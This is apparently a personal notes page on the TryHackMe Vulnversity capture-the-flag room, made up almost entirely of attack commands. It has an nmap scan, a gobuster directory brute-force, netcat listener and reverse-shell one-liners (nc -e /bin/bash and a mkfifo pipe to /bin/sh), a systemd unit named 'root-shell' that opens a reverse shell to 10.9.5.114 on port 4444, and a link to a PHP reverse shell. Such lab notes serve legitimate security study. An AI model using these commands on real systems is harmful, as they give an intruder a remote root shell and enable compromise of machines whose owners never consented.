---
layout: md
title: TryHackMe Vulnversity CTF
description: Notes on tryhackme.com's vulnversity challenge
tags: ['security', 'tryhackme']
sort_key: 1
---

{% include project-headers.html %}

Use nmap to scan ports and try to find details about services and versions on those ports 
```bash
nmap -sV -sC <target>
```

Try bruteforce webpages/directories using [gobuster](https://github.com/OJ/gobuster)
```bash
gobuster dir -u <webapp> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

#### Netcat commands
```
nc -lvnp 4444 [> /path/to/file.ext]
nc -e /bin/bash <ip> <port>

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
```

```bash
[Unit]
Description=root-shell

[Service]
ExecStart=/bin/bash -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.5.114 4444 >/tmp/f"

[Install]
WantedBy=multi-user.target
```

[PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
